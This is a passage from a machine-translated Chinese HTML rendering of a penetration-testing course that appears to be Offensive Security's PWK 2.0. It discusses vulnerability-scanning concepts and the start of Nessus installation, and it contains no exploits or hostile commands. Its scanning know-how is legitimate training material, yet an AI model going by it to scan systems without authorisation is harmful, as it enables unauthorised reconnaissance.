<div style="position:absolute;top:245494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和手动审查的完美伴侣。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:245556;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花时间了解我们计划使用的任何自动化工具的内部工作原理</font></font></i></nobr></div>
<div style="position:absolute;top:245575;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在现场使用是非常有价值的练习。</font><font style="vertical-align: inherit;">这不仅会帮助我们</font></font></i></nobr></div>
<div style="position:absolute;top:245594;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置工具并正确消化结果，但会帮助我们</font></font></i></nobr></div>
<div style="position:absolute;top:245614;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解手动应用必须克服的限制</font></font></i></nobr></div>
<div style="position:absolute;top:245633;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专业知识。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:245695;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.2 手动与自动扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:245733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们应该在评估过程中结合手动和自动扫描技术，但适当的</font></font></nobr></div>
<div style="position:absolute;top:245753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着经验的增加，平衡变得更加明显。</font></font></nobr></div>
<div style="position:absolute;top:245786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们讨论一下手动和自动扫描的主要优缺点</font></font></nobr></div>
<div style="position:absolute;top:245805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以帮助在评估过程中取得适当的平衡。</font></font></nobr></div>
<div style="position:absolute;top:245838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对远程目标网络的人工审查将不可避免地耗费大量资源和时间。</font></font></nobr></div>
<div style="position:absolute;top:245857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消耗。</font><font style="vertical-align: inherit;">由于这种方法严重依赖人工交互和重复性任务，因此</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:245923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(CGISecurity.com, 2008), https://www.cgisecurity.com/questions/falsepositive.shtml</font></font></font></nobr></div>
<div style="position:absolute;top:245943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（CGISecurity.com，2008），https://www.cgisecurity.com/questions/falsenegative.shtml</font></font></font></nobr></div>
<div style="position:absolute;top:245963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">222 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（红帽，2020 年），https://access.redhat.com/security/updates/backporting</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:246091;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="208"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第208页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:246124;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:247201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:247201;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:247201;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:246220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">容易出现错误，其中的漏洞可能会被忽视。</font><font style="vertical-align: inherit;">尽管如此，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">红队</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">223</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:246239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特别是，需要手术精度和最小的网络足迹才能保持</font></font></nobr></div>
<div style="position:absolute;top:246258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽可能长时间不被发现。</font><font style="vertical-align: inherit;">在这些类型的情况下使用自动扫描仪不会</font></font></nobr></div>
<div style="position:absolute;top:246278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成为最好的方法。</font><font style="vertical-align: inherit;">此外，手动分析允许发现复杂和合乎逻辑的</font></font></nobr></div>
<div style="position:absolute;top:246297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用任何类型的自动扫描器都很难发现的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:246330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，在处理大型活动时，自动化漏洞扫描程序是无价的</font></font></nobr></div>
<div style="position:absolute;top:246349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在与传统安全评估相关的典型时间限制下。</font><font style="vertical-align: inherit;">是否使用</font></font></nobr></div>
<div style="position:absolute;top:246368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨整个目标网络或针对单个专用主机的通用扫描仪，我们可以</font></font></nobr></div>
<div style="position:absolute;top:246388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在更短的时间内建立基线。</font><font style="vertical-align: inherit;">这些基线使我们能够轻松验证-</font></font></nobr></div>
<div style="position:absolute;top:246407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测到的漏洞，或者至少帮助我们了解</font></font></nobr></div>
<div style="position:absolute;top:246427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标。</font></font></nobr></div>
<div style="position:absolute;top:246460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然非常宝贵，但漏洞扫描也有缺点。</font><font style="vertical-align: inherit;">扫描配置可以</font></font></nobr></div>
<div style="position:absolute;top:246479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广泛而复杂的默认设置可能会损害目标。</font><font style="vertical-align: inherit;">例如，许多扫描仪</font></font></nobr></div>
<div style="position:absolute;top:246498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以并且将尝试暴力破解弱密码。</font><font style="vertical-align: inherit;">在交战期间，蛮力</font></font></nobr></div>
<div style="position:absolute;top:246518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术应受到严格监管，因为它们可能导致帐户锁定，从而导致</font></font></nobr></div>
<div style="position:absolute;top:246537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户的重大停机时间。</font><font style="vertical-align: inherit;">了解漏洞扫描程序的工作原理很重要</font></font></nobr></div>
<div style="position:absolute;top:246556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及在执行扫描之前它的功能是什么。</font></font></nobr></div>
<div style="position:absolute;top:246589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，在使用自动漏洞扫描器时，我们作为渗透测试员的工作是</font></font></nobr></div>
<div style="position:absolute;top:246608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供超出任何工具输出的价值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:246643;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.3 互联网扫描与内部扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:246681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描器可以轻松扫描连接到 Internet 的目标以及连接到网络的目标。</font></font></nobr></div>
<div style="position:absolute;top:246700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地网络。</font><font style="vertical-align: inherit;">但是，如果我们处理这些目标，我们的扫描结果可能会不完整或不准确</font></font></nobr></div>
<div style="position:absolute;top:246719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">平等。</font><font style="vertical-align: inherit;">我们与目标相关的网络布局会影响我们的速度阈值、访问</font></font></nobr></div>
<div style="position:absolute;top:246739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权利、交通干扰的可能性和目标可见性。</font></font></nobr></div>
<div style="position:absolute;top:246772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们与目标网络的连接速度不仅决定了可用的原始带宽</font></font></nobr></div>
<div style="position:absolute;top:246791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的扫描仪，但其他因素，例如到各个主机的跃点数。</font><font style="vertical-align: inherit;">这意味着</font></font></nobr></div>
<div style="position:absolute;top:246810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以更快地对本地连接的设备进行更具侵入性和全面的扫描</font></font></nobr></div>
<div style="position:absolute;top:246830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机。</font><font style="vertical-align: inherit;">但是，我们必须始终注意我们的流量，意识到旧设备可能</font></font></nobr></div>
<div style="position:absolute;top:246849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受到大量扫描的不利影响。</font><font style="vertical-align: inherit;">为获得最佳结果，请考虑在</font></font></nobr></div>
<div style="position:absolute;top:246868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前面模块中的端口扫描讨论。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:246930;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了获得更好的扫描结果，请考虑限制扫描速度和超时</font></font></i></nobr></div>
<div style="position:absolute;top:246950;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最初的价值观。</font><font style="vertical-align: inherit;">一旦您对结果的质量感到满意，您就可以</font></font></i></nobr></div>
<div style="position:absolute;top:246969;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始逐渐增加速度，直到达到良好的平衡。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:247031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在网络上的定位也会影响我们的访问权限和流量的可能性</font></font></nobr></div>
<div style="position:absolute;top:247050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们的目标通信时的干扰。</font><font style="vertical-align: inherit;">防火墙或入侵防御系统 (IPS)，</font></font></nobr></div>
<div style="position:absolute;top:247070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，可能会阻止我们访问主机或端口，并可能会在生成时丢弃我们的流量</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:247151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">223 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（丹尼尔·米斯勒，2020 年），https://danielmiessler.com/study/red-blue-purple-teams/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:247279;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="209"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第209页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:247312;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:248389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:248389;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:248389;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">209</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:247408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全警报。</font><font style="vertical-align: inherit;">这些设备限制了我们的能力并随后掩盖了我们的漏洞</font></font></nobr></div>
<div style="position:absolute;top:247427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们背后的目标，这将对我们提供给客户的最终产品产生负面影响。</font></font></nobr></div>
<div style="position:absolute;top:247460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们的网络定位会影响目标可见性。</font><font style="vertical-align: inherit;">例如，一个典型的漏洞</font></font></nobr></div>
<div style="position:absolute;top:247479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描器将尝试通过 ping 扫描或 ARP 扫描来发现目标。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，互联网——</font></font></nobr></div>
<div style="position:absolute;top:247499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接的目标将无法接收来自外部子网的 ARP 流量并且可能会阻塞</font></font></nobr></div>
<div style="position:absolute;top:247518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ICMP (ping) 请求，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">225</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着扫描器可能会完全错过目标，如果它已经</font></font></nobr></div>
<div style="position:absolute;top:247537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置为仅依赖于这些发现选项。</font></font></nobr></div>
<div style="position:absolute;top:247570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要花时间彻底了解目标网络，准确的网络位置</font></font></nobr></div>
<div style="position:absolute;top:247589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将从中操作，以及我们的网络定位提供的目标访问。</font><font style="vertical-align: inherit;">而当我们</font></font></nobr></div>
<div style="position:absolute;top:247609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总是说，重要的是要了解您的工具以及它们在幕后的工作方式。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:247643;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.4 认证与未认证扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:247681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数扫描仪都可以配置为运行经过身份验证的扫描，其中扫描仪登录到</font></font></nobr></div>
<div style="position:absolute;top:247700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有一组有效凭据的目标。</font><font style="vertical-align: inherit;">在大多数情况下，经过身份验证的扫描使用特权用户</font></font></nobr></div>
<div style="position:absolute;top:247720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户以获得对目标系统的最佳可见性。</font></font></nobr></div>
<div style="position:absolute;top:247753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要对 Linux 目标运行经过身份验证的扫描，我们只需在 Linux 上启用 SSH 服务</font></font></nobr></div>
<div style="position:absolute;top:247772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用有效的用户凭据定位并配置扫描仪。</font><font style="vertical-align: inherit;">大多数扫描仪将使用此访问权限</font></font></nobr></div>
<div style="position:absolute;top:247791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看软件包版本并验证配置以尝试发现潜在的</font></font></nobr></div>
<div style="position:absolute;top:247811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font></font></nobr></div>
<div style="position:absolute;top:247843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 身份验证通常需要 Windows Management Instrumentation (WMI) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">226</font></font></font></nobr></div>
<div style="position:absolute;top:247863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及具有远程管理权限的域或本地帐户的凭据。</font><font style="vertical-align: inherit;">笔记</font></font></nobr></div>
<div style="position:absolute;top:247882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使配置了 WMI，其他因素也可能会阻止身份验证，包括 UAC </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">227</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和防火墙</font></font></nobr></div>
<div style="position:absolute;top:247902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置。</font><font style="vertical-align: inherit;">但是，一旦正确配置了访问权限，大多数扫描仪就会分析系统</font></font></nobr></div>
<div style="position:absolute;top:247921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置、注册表设置以及应用程序和系统补丁级别。</font><font style="vertical-align: inherit;">他们还审查文件</font></font></nobr></div>
<div style="position:absolute;top:247940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 文件夹中的 Program Files 目录以及所有支持的可执行文件和 DLL，</font></font></nobr></div>
<div style="position:absolute;top:247960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有这些都是为了检测潜在的易受攻击的软件。</font></font></nobr></div>
<div style="position:absolute;top:247992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过身份验证的扫描会生成大量附加信息并产生更准确的信息</font></font></nobr></div>
<div style="position:absolute;top:248012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果以更长的扫描时间为代价。</font><font style="vertical-align: inherit;">虽然在一个过程中可以使用经过身份验证的扫描</font></font></nobr></div>
<div style="position:absolute;top:248031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试（例如，使用发现的凭据），它在测试过程中更常用</font></font></nobr></div>
<div style="position:absolute;top:248050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">补丁管理流程。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:248088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2 Nessus 漏洞扫描</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:248129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们超越理论并开始研究工具时，我们将首先关注</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nessus</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，一个流行的</font></font></nobr></div>
<div style="position:absolute;top:248149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持惊人的 130,000 个插件</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">228</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（漏洞检查）的</font><font style="vertical-align: inherit;">漏洞扫描器</font></font></nobr></div>
<div style="position:absolute;top:248168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">撰写本文的时间。</font><font style="vertical-align: inherit;">虽然最初是作为开源应用程序开发的，但在 2005 年</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:248245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">224 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tenable，2019 年），https://docs.tenable.com/nessus/Content/DiscoverySettings.htm#HostDiscovery</font></font></font></nobr></div>
<div style="position:absolute;top:248265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">225 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/man-host-discovery.html</font></font></font></nobr></div>
<div style="position:absolute;top:248285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">226 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/desktop/wmisdk/about-wmi</font></font></font></nobr></div>
<div style="position:absolute;top:248305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">227 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:248320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户控制工程</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:248339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">228 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Tenable，2020 年），https://www.tenable.com/products/nessus</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:248467;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="210"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 210 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:248500;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:249577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:249577;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:249577;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">210</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:248596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关门了。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">229</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对闭源模型的改变导致了开源项目的分支，</font></font></nobr></div>
<div style="position:absolute;top:248615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及 OpenVAS 的发布。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230</font></font></font></nobr></div>
<div style="position:absolute;top:248648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有许多商业和开源漏洞扫描器，具有不同的优势和</font></font></nobr></div>
<div style="position:absolute;top:248667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">弱点。</font><font style="vertical-align: inherit;">然而，Nessus 是一个相当有能力的行业标准，免费的“Essentials”</font></font></nobr></div>
<div style="position:absolute;top:248687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本允许我们最多扫描 16 个 IP。</font><font style="vertical-align: inherit;">它让我们深入了解如何使用完整的商业版本</font></font></nobr></div>
<div style="position:absolute;top:248706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有时间限制或其他限制。</font><font style="vertical-align: inherit;">本节中讨论的总体概念通常将</font></font></nobr></div>
<div style="position:absolute;top:248725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几乎也适用于任何其他商业扫描仪。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:248760;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.1 安装 Nessus</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:248798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就本模块而言，请注意您需要在您所在的 VM 上安装 Nessus</font></font></nobr></div>
<div style="position:absolute;top:248817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于连接到 PWK 实验室，因为需要互联网连接才能激活</font></font></nobr></div>
<div style="position:absolute;top:248836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nessus 实例，以及下载插件。</font><font style="vertical-align: inherit;">值得一提的是</font></font></nobr></div>
<div style="position:absolute;top:248856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描程序通常是资源密集型的。</font><font style="vertical-align: inherit;">他们中的许多人建议最低限度</font></font></nobr></div>
<div style="position:absolute;top:248875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求包括至少 2 个 CPU 内核以及 8GB 的​​ RAM。</font><font style="vertical-align: inherit;">这些资源</font></font></nobr></div>
<div style="position:absolute;top:248895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的示例不需要要求。</font></font></nobr></div>
<div style="position:absolute;top:248927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在开始安装之前，我们应该更新 Kali 的软件包列表并升级到最新的</font></font></nobr></div>
<div style="position:absolute;top:248947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现有软件包的版本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:248982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt upgrade</font></font></font></b></nobr></div>
<div style="position:absolute;top:249001;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 274 - 更新包列表和升级包</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:249030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管 Nessus 在 Kali 存储库中不可用，但我们可以手动下载 64 位 .deb</font></font></nobr></div>
<div style="position:absolute;top:249050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Tenable 网站的 Kali 文件：https://www.tenable.com/downloads/nessus。</font></font></nobr></div>
<div style="position:absolute;top:249082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过点击下载页面的“校验和”链接来查看SHA256校验和值</font></font></nobr></div>
<div style="position:absolute;top:249102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（图 44）并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sha256sum</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证下载文件的校验和</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
